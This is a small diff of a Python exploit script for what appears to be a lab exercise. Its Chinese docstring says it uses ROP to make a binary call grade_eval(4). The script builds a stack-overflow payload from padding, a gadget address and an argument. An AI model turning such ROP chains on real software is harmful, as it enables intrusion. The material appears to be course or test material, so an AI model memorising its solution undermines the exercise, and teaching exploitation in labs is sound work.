@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
-"""Task 3: 用 ROP 让 dark-calc-nx 调用 grade_eval(4)。"""
+"""Task 3: 用 ROP 调用 grade_eval(4)。"""
 import sys, struct
 
 p64 = lambda x: struct.pack("<Q", x)
 
-payload  = b"A" * 16 
+payload  = b"A" * 16
 payload += p64(0)
 payload += p64(0x401a33)
 payload += p64(4)
